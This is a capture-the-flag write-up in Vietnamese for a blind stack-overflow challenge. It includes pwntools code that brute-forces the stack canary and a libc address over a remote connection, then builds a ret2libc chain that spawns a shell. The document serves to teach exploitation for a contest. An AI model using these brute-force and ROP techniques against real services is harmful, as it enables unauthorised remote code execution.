# warmup
- Bài này dạng blind, trong KCSCCTF cũng có dạng tương tự nhưng lần này biến đổi 1 xíu
- Chương trình sẽ tạo cho ta 1 port khác để ta brute-force
- Do port này không thay đổi canary với mỗi lần `remote`.
- Đầu tiên ta cần brute-force canary
```python
canary = []
for i in range (8):
    for j in range(0x100):
        while(True):
            try:
                p = remote(HOST, PORT, timeout=5)
                break
            except:
                j-=1
                sleep(3)
                continue
        payload = b"a" * 56 + b"".join([p8(b) for b in canary]) + p8(j)
        s(payload)
        data = p.recvrepeat(timeout=10)
        print(f"Trying: {hex(j)}")
        
        if b"*** stack smashing detected ***" not in data:
            canary.append(j)
            info(f"Canary: {canary}")
            p.close()
            
            break
        p.close()
```

- Lần thứ 2 ta sẽ brute-force để leak libc
- Ta để ý có đoạn trong chương trình như này
```c
  if ( check )
  {
    puts("This is helper for you\n");
    return 0;
  }
```
- Nghĩa là nếu ta thay đổi rip để chương trình lặp lại hàm main thì nó sẽ in ra dòng `"This is..`
- Để có thể loop lại về main mà vẫn leak được libc thì ta kiểm tra ở `__libc_start_main`
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/50c237f4-072f-49bd-be29-e52ed922dd71)
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/40d88f53-f165-477d-8f74-40edeb9eeb4c)
- Vậy ta biết được 1byte của libc là `0x89`, nó kiểu như dừng gadget vậy 
```python
libc_leak = [0x89]
for i in range(8):
    for j in range(0, 0x100):
        while(True):
            try:
                p = remote(HOST, PORT, timeout=5)
                break
            except:
                j-=1
                sleep(3)
                continue
        s(payload + b"".join([p8(x) for x in libc_leak]) + p8(j))
        data = p.recvrepeat(timeout=10)
        info("" + str(j))
        if b"This is helper for you" in data:
            libc_leak.append(j)
            info(f"Libc: {libc_leak}")
            p.close()
            break
        p.close()
```
- Cuối cùng là ret2libc (không dùng one_gadget vì nó có độ rủi ro tạch, nên ret2libc là an toàn nhất)

```python
p = remote(HOST, PORT, timeout=5)
print(canary)
print(libc_leak)
libc_leak = libc_leak[::-1]
libc_leak = "0x" + "".join(hex(x)[2:] for x in libc_leak)
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - 0x23a89
info("libc base: " + hex(libc.address))
info("leak" + hex(libc_leak))
pop_rdi = libc.address + 0x00000000000240e5
payload += flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.address + 0x0000000000022fd9, libc.sym['system']
)
s(payload)
```
# Kết quả
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/65bce9cf-79ab-4d5f-8f47-6bae308c0372)
